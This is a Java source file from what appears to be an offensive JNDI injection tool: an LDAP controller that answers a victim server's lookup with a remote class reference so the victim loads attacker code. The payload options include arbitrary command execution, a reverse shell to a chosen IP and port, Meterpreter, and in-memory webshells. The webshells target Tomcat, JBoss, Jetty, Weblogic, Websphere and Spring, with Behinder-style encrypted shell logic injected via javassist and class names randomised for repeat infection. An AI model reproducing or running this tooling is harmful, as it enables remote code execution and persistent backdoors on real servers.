package com.nu1r.jndi.controllers;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.exceptions.IncorrectParamsException;
import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
import com.nu1r.jndi.gadgets.utils.Utils;
import com.nu1r.jndi.template.*;
import com.nu1r.jndi.template.Weblogic.WeblogicMemshellTemplate1;
import com.nu1r.jndi.template.Weblogic.WeblogicMemshellTemplate2;
import com.nu1r.jndi.template.Websphere.WSFMSFromThread;
import com.nu1r.jndi.template.Websphere.WebsphereMemshellTemplate;
import com.nu1r.jndi.template.jboss.JBSMSFromContextS;
import com.nu1r.jndi.template.jboss.JBFMSFromContextF;
import com.nu1r.jndi.template.jetty.JFMSFromJMXF;
import com.nu1r.jndi.template.jetty.JSMSFromJMXS;
import com.nu1r.jndi.template.spring.SpringInterceptorMS;
import com.nu1r.jndi.template.tomcat.*;
import com.nu1r.jndi.utils.Config;
import com.nu1r.jndi.utils.Util;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javassist.*;
import org.apache.commons.codec.binary.Base64;

import java.net.URL;

import static com.nu1r.jndi.template.shell.MemShellPayloads.*;
import static org.fusesource.jansi.Ansi.ansi;

@LdapMapping(uri = {"/basic"})
public class BasicController implements LdapController {
    //最后的反斜杠不能少
    private String      codebase = Config.codeBase;
    private PayloadType type;
    private String[]    params;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Sending LDAP ResourceRef result for |@" + base + " @|MAGENTA with basic remote reference payload|@"));
        Entry     e         = new Entry(base);
        String    className = "";
        CtClass   ctClass   = null;
        ClassPool pool      = ClassPool.getDefault();


        switch (type) {
            case dnslog:
                DnslogTemplate dnslogTemplate = new DnslogTemplate(params[0]);
                dnslogTemplate.cache();
                className = dnslogTemplate.getClassName();
                break;
            case command:
                CommandTemplate commandTemplate = new CommandTemplate(params[0]);
                commandTemplate.cache();
                className = commandTemplate.getClassName();
                break;
            case reverseshell:
                ReverseShellTemplate reverseShellTemplate = new ReverseShellTemplate(params[0], params[1]);
                reverseShellTemplate.cache();
                className = reverseShellTemplate.getClassName();
                break;
            case tomcatecho:
                className = TomcatEchoTemplate.class.getName();
                break;
            case springecho:
                className = SpringEchoTemplate.class.getName();
                break;
            case weblogicecho:
                className = WeblogicEchoTemplate.class.getName();
                break;
            case tomcatfilterjmx:
                className = TFMSFromJMXF.class.getName();
                ctClass = pool.get(className);
                insertKeyMethod(ctClass,"bx");
                break;
            case tomcatfilterth:
                className = TFMSFromThreadF.class.getName();
                ctClass = pool.get(className);
                insertKeyMethod(ctClass,"bx");
                break;
            case tomcatlistenerjmx:
                className = TLMSFromJMXLi.class.getName();
                ctClass = pool.get(className);
                insertKeyMethod(ctClass,"bx");
                break;
            case tomcatlistenerth:
                className = TLMSFromThreadLi.class.getName();
                ctClass = pool.get(className);
                insertKeyMethod(ctClass,"bx");
                break;
            case tomcatservletjmx:
                className = TSMSFromJMXS.class.getName();
                ctClass = pool.get(className);
                insertKeyMethod(ctClass,"bx");
                break;
            case tomcatservletth:
                className = TSMSFromThreadS.class.getName();
                ctClass = pool.get(className);
                insertKeyMethod(ctClass,"bx");
                break;
            case jbossfilter:
                className = JBFMSFromContextF.class.getName();
                ctClass = pool.get(className);
                insertKeyMethod(ctClass,"bx");
                break;
            case jbossservlet:
                className = JBSMSFromContextS.class.getName();
                ctClass = pool.get(className);
                insertKeyMethod(ctClass,"bx");
                break;
            case weblogicmemshell1:
                className = WeblogicMemshellTemplate1.class.getName();
                break;
            case weblogicmemshell2:
                className = WeblogicMemshellTemplate2.class.getName();
                break;
            case webspherememshell:
                className = WebsphereMemshellTemplate.class.getName();
                break;
            case springinterceptor:
                className = SpringInterceptorMS.class.getName();
                String target = "com.nu1r.jndi.template.spring.SpringMemshellTemplate";
                CtClass springTemplateClass = pool.get(target);
                // 类名后加时间戳
                String clazzName = target + System.nanoTime();
                springTemplateClass.setName(clazzName);
                String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
                // 修改b64字节码
                String b64content = "b64=\"" + encode + "\";";
                ctClass.makeClassInitializer().insertBefore(b64content);
                // 修改 SpringInterceptorMemShell 随机命名 防止二次打不进去
                String clazzNameContent = "clazzName=\"" + clazzName + "\";";
                ctClass.makeClassInitializer().insertBefore(clazzNameContent);
                ctClass.setName(SpringInterceptorMS.class.getName() + System.nanoTime());
                break;
            case issuccess:
                className = isSuccess.class.getName();
                break;
            case jettyfilter:
                className = JFMSFromJMXF.class.getName();
                ctClass = pool.get(className);
                insertKeyMethod(ctClass,"bx");
                break;
            case jettyservlet:
                className = JSMSFromJMXS.class.getName();
                ctClass = pool.get(className);
                insertKeyMethod(ctClass,"bx");
                break;
            case wsfilter:
                className = WSFMSFromThread.class.getName();
                ctClass = pool.get(className);
                insertKeyMethod(ctClass,"ws");
                break;
            case meterpreter:
                className = Meterpreter.class.getName();
                break;
        }

        URL turl = new URL(new URL(this.codebase), className + ".class");
        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Send LDAP reference result for |@" + base + " @|MAGENTA redirecting to |@" + turl));
        e.addAttribute("javaClassName", "foo");
        e.addAttribute("javaCodeBase", this.codebase);
        e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
        if (className.equals("com.feihong.ldap.template.Meterpreter")) {
            e.addAttribute("javaFactory", "Meterpreter");
        }
        e.addAttribute("javaFactory", className);
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        try {
            int fistIndex   = base.indexOf("/");
            int secondIndex = base.indexOf("/", fistIndex + 1);
            if (secondIndex < 0) secondIndex = base.length();

            try {
                type = PayloadType.valueOf(base.substring(fistIndex + 1, secondIndex).toLowerCase());
                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Paylaod >> |@" + type));
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + base.substring(fistIndex + 1, secondIndex));
            }

            switch (type) {
                case dnslog:
                    String url = base.substring(base.lastIndexOf("/") + 1);
                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA URL >> |@" + url));
                    params = new String[]{url};
                    break;
                case command:
                    String cmd = Util.getCmdFromBase(base);
                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
                    params = new String[]{cmd};
                    break;
                case reverseshell:
                    String[] results = Util.getIPAndPortFromBase(base);
                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA IP >> |@" + results[0]));
                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Port >> |@" + results[1]));
                    params = results;
                    break;
            }
        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;

            throw new IncorrectParamsException("Incorrect params >> " + base);
        }
    }

    public static void insertKeyMethod(CtClass ctClass, String type) throws Exception {

        // 判断是否为 Tomcat 类型，需要对 request 封装使用额外的 payload
        String name = ctClass.getName();
        name = name.substring(name.lastIndexOf(".") + 1);

        // 判断是 filter 型还是 servlet 型内存马，根据不同类型写入不同逻辑
        String method = "";

        CtClass[] classes = ctClass.getInterfaces();
        for (CtClass aClass : classes) {
            String iName = aClass.getName();
            if (iName.equals("javax.servlet.Servlet")) {
                method = "service";
                break;
            } else if (iName.equals("javax.servlet.Filter")) {
                method = "doFilter";
                break;
            } else if (iName.equals("javax.servlet.ServletRequestListener")) {
                method = "requestInitializedHandle";
                break;
            } else if (iName.equals("javax.websocket.MessageHandler$Whole")) {
                method = "onMessage";
                break;
            }
        }



        switch (type) {
            // 冰蝎类型的内存马
            case "bx":
                ctClass.addMethod(CtMethod.make(Utils.base64DecodeShell(BASE64_DECODE_STRING_TO_BYTE), ctClass));
                ctClass.addMethod(CtMethod.make(Utils.base64DecodeShell(GET_FIELD_VALUE), ctClass));

                insertMethod(ctClass, method, Utils.base64DecodeShell(BEHINDER_AES));
                break;
            case "ws":
                ctClass.addMethod(CtMethod.make(Utils.base64DecodeShell(TO_CSTRING_Method), ctClass));
                ctClass.addMethod(CtMethod.make(Utils.base64DecodeShell(GET_METHOD_BY_CLASS), ctClass));
                ctClass.addMethod(CtMethod.make(Utils.base64DecodeShell(GET_METHOD_AND_INVOKE), ctClass));
                ctClass.addMethod(CtMethod.make(Utils.base64DecodeShell(GET_FIELD_VALUE), ctClass));

                insertMethod(ctClass, method, Utils.base64DecodeShell(WS_SHELL));
                break;
        }

    }

    public static void insertMethod(CtClass ctClass, String method, String payload) throws NotFoundException, CannotCompileException {
        // 根据传入的不同参数，在不同方法中插入不同的逻辑
        CtMethod cm = ctClass.getDeclaredMethod(method);
        cm.setBody(payload);
    }
}
